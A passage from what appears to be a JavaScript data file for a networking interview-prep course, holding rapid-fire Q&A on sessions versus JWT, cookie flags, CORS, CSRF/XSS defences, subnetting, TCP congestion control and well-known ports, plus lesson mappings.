          ["Session vs JWT?", "Session: state on server, id in cookie, easy revoke. JWT: signed self-contained token, stateless, hard to revoke."],
          ["HttpOnly / Secure / SameSite?", "No JS access / HTTPS only / limits cross-site sending (CSRF defence)."],
          ["CORS preflight?", "Browser sends OPTIONS with Origin + requested method/headers; proceeds only if the server returns matching Access-Control-Allow-* headers."],
          ["CSRF vs XSS defence?", "CSRF: SameSite cookies + CSRF tokens + Origin check. XSS: output encoding + CSP + HttpOnly cookies + sanitising."]
        ] } },
        { tip: "In a rapid-fire round the interviewer is checking breadth: answer in one sentence, then stop. If they want more they'll ask 'why?' — and the full lessons for Days 29–32 have the why." }
      ] }
    ],
    practice: [
      { q: "Say the 12-step URL answer out loud in under 2 minutes, without notes.", a: "1 Parse URL + HSTS + HTTP cache. 2 DNS caches (browser → OS/hosts → router → resolver). 3 Resolver walks root → TLD → authoritative, gets A/AAAA, caches by TTL. 4 Not local → default gateway, ARP for its MAC. 5 TCP SYN/SYN-ACK/ACK to port 443. 6 TLS 1.3: hello + key share + SNI/ALPN, certificate verified, session keys. 7 Encrypted GET with Host/Cookie headers. 8 Encapsulation, NAT at home router, routers hop by hop, CDN edge. 9 LB/reverse proxy → app server → cache/DB. 10 Response: status, headers, HTML. 11 Parse HTML/CSS into DOM/CSSOM, fetch sub-resources, run JS. 12 Layout, paint, composite; keep-alive, later FIN close." },
      { q: "Rapid: network address and usable hosts of 10.10.10.200/28?", a: "Block 16 → network 10.10.10.192, broadcast .207, 14 usable hosts." },
      { q: "Rapid: cwnd = 24 MSS when 3 duplicate ACKs arrive (Reno). New ssthresh and cwnd? And if it had been a timeout?", a: "Dup ACKs: ssthresh = 12, cwnd = 12, then linear growth. Timeout: ssthresh = 12, cwnd = 1, slow start." },
      { q: "Rapid: which transport protocol and port for DNS, DHCP server, HTTPS, SSH, SMTP?", a: "DNS UDP 53 (TCP 53 for big answers), DHCP server UDP 67, HTTPS TCP 443 (UDP 443 for HTTP/3), SSH TCP 22, SMTP TCP 25 (587 for submission)." }
    ],
    related: ["cn:what-happens-google", "cn:osi-model", "cn:tcp-vs-udp", "cn:tcp-3-way-handshake", "cn:tcp-connection-termination", "cn:tcp-flow-vs-congestion-control", "cn:subnetting", "cn:dns-resolution", "cn:dns-records", "cn:dhcp", "cn:nat", "cn:http-methods", "cn:http-status-codes", "cn:http-versions", "cn:http-vs-https", "cn:tls-handshake", "cn:cookies-sessions-tokens", "cn:ports-well-known"]
  });

  map("d29-ev", ["cn-layers-url"]);
  map("d30-ev", ["cn-tcp-udp"]);
  map("d31-ev", ["cn-ip-subnetting", "cn-nat-dns-dhcp"]);
  map("d32-ev", ["cn-http", "cn-web-security"]);
  map("d54-ev", ["cn-rapid-fire", "cn-layers-url", "cn-tcp-udp", "cn-nat-dns-dhcp", "cn-web-security", "cn-http", "cn-ip-subnetting"]);
  map("d53-af", ["cn-rapid-fire", "cn-layers-url", "cn-tcp-udp", "cn-ip-subnetting", "cn-nat-dns-dhcp", "cn-http", "cn-web-security"]);
})();
